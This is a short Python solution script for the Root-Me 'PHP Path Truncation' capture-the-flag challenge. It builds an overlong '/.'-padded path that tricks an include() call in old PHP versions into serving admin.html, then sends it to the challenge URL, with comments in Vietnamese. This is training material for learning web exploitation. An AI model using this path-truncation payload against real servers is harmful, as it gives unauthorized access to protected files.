# https://www.root-me.org/en/Challenges/Web-Server/PHP-Path-Truncation
import requests

truncation = ''
for i in range(2048): # 4096/2: maximun string ở PHP<5.3 là 4096 characters, quá ->truncation(cắt bớt)
	truncation += '/.'

payload = 'hello/../admin.html' + truncation # hello:thư mục giả -> cần lừa include() đây là 1 path
r = requests.get('http://challenge01.root-me.org/web-serveur/ch35/index.php?page=' + payload)

#print(r.url);
print(r.text) # html code